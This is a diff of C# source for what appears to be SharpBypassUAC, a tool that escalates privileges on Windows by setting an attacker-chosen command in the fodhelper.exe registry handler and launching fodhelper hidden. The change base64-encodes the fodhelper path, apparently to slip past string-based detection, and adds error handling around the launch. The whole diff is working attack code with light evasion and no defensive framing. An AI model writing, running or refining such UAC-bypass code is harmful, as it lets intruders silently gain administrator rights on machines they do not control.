@@ -1,8 +1,6 @@
 ﻿using System;
 using System.Threading;
 using System.Diagnostics;
-using System.Collections.Generic;
-using System.Linq;
 using System.Text;
 using Microsoft.Win32;
 
@@ -29,12 +27,20 @@ namespace SharpBypassUAC
             fod.SetValue("", @command);
             fod.Close();
 
-            //start fodhelper
-            Process p = new Process();
-            p.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
-            p.StartInfo.FileName = "C:\\windows\\system32\\fodhelper.exe";
-            p.Start();
-
+            try
+            {
+                //start fodhelper
+                Process p = new Process();
+                p.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
+                byte[] exe = Convert.FromBase64String("QzpcXHdpbmRvd3NcXHN5c3RlbTMyXFxmb2RoZWxwZXIuZXhl");
+                p.StartInfo.FileName = Encoding.UTF8.GetString(exe); 
+                p.Start();
+            }
+            catch (Exception e)
+            {
+                Console.WriteLine("Unable to start  [x] {0}", e.Message);
+            }
+;
             //sleep 10 seconds to let the payload execute
             Thread.Sleep(10000);
 
